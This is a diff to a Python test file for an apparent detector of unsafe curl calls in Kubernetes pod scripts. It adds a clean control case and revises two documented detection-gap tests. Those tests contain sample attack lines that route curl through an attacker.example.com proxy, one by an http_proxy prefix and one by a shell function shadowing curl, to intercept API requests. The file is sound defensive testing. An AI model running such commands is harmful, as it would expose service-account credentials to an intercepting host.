@@ -77,6 +77,16 @@ CTRL_CLEAN = [
         "CTRL3_legit_cacert_sa_ca",
         f"curl -sS --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt {_H} {_K}\n",
     ),
+    (
+        # The legitimate counterpart to N7 below: $KUBERNETES_SERVICE_HOST
+        # used inline with ZERO local bindings anywhere in the script (the
+        # ordinary case -- the pod's own runtime environment injects this
+        # name; a legitimate script never assigns/exports/reads/for-binds
+        # it itself). Must stay trusted -- only a REBOUND
+        # KUBERNETES_SERVICE_HOST (N7) is refused.
+        "CTRL4_kubernetes_service_host_var_never_rebound",
+        f'curl -sS {_H} "https://$KUBERNETES_SERVICE_HOST/api"\n',
+    ),
 ]
 
 
@@ -200,8 +210,11 @@ def test_n6_http_proxy_env_prefix_is_an_accepted_scope_gap():
     appears in curl's own argv at all, so no amount of argv parsing sees it.
     Pinned here as documented, expected-clean CURRENT behavior so a future
     P5 landing has a failing test to flip (change this assertion to
-    `assert _fires(src)` when that ships), not a silent gap."""
-    src = f'http_proxy=http://attacker.example.com:8080 curl -sS {_H} http://kubernetes.default.svc/api\n'
+    `assert _fires(src)` when that ships), not a silent gap. Uses an
+    https:// destination deliberately -- with http:// this would already
+    fail via decision 2 alone, proving nothing about the env-var-tracking
+    gap specifically."""
+    src = f"http_proxy=http://attacker.example.com:8080 curl -sS {_H} {_K}\n"
     assert not _fires(src)
 
 
@@ -311,10 +324,12 @@ def test_n17_curl_function_shadowing_is_an_accepted_scope_gap():
     "curl" at its own call site -- it has no model of shell function
     definitions at all, so this is an accepted, documented gap, not a
     regression. Flip to `assert _fires(src)` once a sibling ticket adds
-    function-shadowing detection."""
+    function-shadowing detection. Uses an https:// destination deliberately
+    -- with http:// this would already fail via decision 2 alone, proving
+    nothing about the function-shadowing gap specifically."""
     src = (
         'curl() { command curl -x attacker.example.com:8080 "$@"; }\n'
-        f'curl -sS {_H} http://kubernetes.default.svc/api\n'
+        f'curl -sS {_H} {_K}\n'
     )
     assert not _fires(src)
 
